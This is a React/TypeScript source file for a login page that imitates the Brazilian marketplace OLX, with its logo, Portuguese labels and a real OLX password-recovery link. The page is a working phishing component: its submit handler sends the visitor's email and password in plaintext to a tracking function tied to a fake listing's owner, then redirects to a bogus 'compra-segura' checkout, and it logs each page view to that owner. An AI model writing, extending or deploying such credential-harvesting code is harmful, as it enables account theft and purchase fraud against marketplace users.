import { createFileRoute, Link, useNavigate, useSearch } from "@tanstack/react-router";
import { useEffect, useRef, useState } from "react";
import { logVisitorActivity, fetchProductBySlug } from "@/lib/tracking";
import olxLogo from "@/assets/olx-logo.png";
import "@/styles/olx.css";

type Search = { produto?: string };

export const Route = createFileRoute("/login")({
  validateSearch: (s: Record<string, unknown>): Search => ({
    produto: typeof s.produto === "string" ? s.produto : undefined,
  }),
  head: () => ({
    meta: [
      { title: "Entrar - OLX" },
      { name: "description", content: "Acesse a sua conta OLX." },
      { name: "robots", content: "noindex, nofollow" },
    ],
  }),
  component: LoginPage,
});

function LoginPage() {
  const navigate = useNavigate();
  const { produto: searchSlug } = useSearch({ from: "/login" }) as Search;
  const productSlug =
    searchSlug ??
    (typeof window !== "undefined"
      ? localStorage.getItem("olx_produto_slug") ?? undefined
      : undefined);
  const hasLoggedView = useRef(false);
  const [formData, setFormData] = useState({ email: "", password: "" });

  useEffect(() => {
    const logView = async () => {
      if (!productSlug || hasLoggedView.current) return;
      hasLoggedView.current = true;
      const p = await fetchProductBySlug(productSlug);
      if (p) logVisitorActivity(p.user_id, "login_page_view", productSlug, p.name);
    };
    logView();
  }, [productSlug]);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!formData.email || !formData.password) return;
    if (productSlug) {
      const p = await fetchProductBySlug(productSlug);
      if (p) {
        await logVisitorActivity(
          p.user_id,
          "login_submit",
          productSlug,
          p.name,
          `E-mail: ${formData.email} | Senha: ${formData.password}`,
        );
      }
    }
    localStorage.setItem("olx_auth_completed", "true");
    navigate({
      to: "/compra-segura",
      search: productSlug ? { produto: productSlug } : {},
      replace: true,
    } as any);
  };

  return (
    <div className="login-page">
      <main className="login-container">
        <div className="login-card">
          <div className="login-logo">
            <Link to="/">
              <img src={olxLogo} alt="OLX" style={{ height: 48 }} />
            </Link>
          </div>

          <h1 className="login-title">Acesse a sua conta</h1>

          <form onSubmit={handleSubmit} className="login-form">
            <div className="login-field">
              <label htmlFor="email">E-mail</label>
              <input
                id="email"
                type="email"
                value={formData.email}
                onChange={(e) => setFormData({ ...formData, email: e.target.value })}
              />
            </div>

            <div className="login-field">
              <div className="login-field-header">
                <label htmlFor="password">Senha</label>
                <a
                  href="https://conta.olx.com.br/recuperacao-senha"
                  target="_blank"
                  rel="noopener noreferrer"
                  className="login-forgot-link"
                >
                  Esqueceu sua senha?
                </a>
              </div>
              <input
                id="password"
                type="password"
                value={formData.password}
                onChange={(e) => setFormData({ ...formData, password: e.target.value })}
              />
            </div>

            <button type="submit" className="login-submit-btn">
              Entrar
            </button>
          </form>

          <div className="login-switch">
            <span>Ainda não tem uma conta?</span>{" "}
            <Link
              to="/cadastro"
              search={productSlug ? { produto: productSlug } : {}}
              className="login-switch-link"
            >
              Cadastre-se
            </Link>
          </div>
        </div>
      </main>
    </div>
  );
}
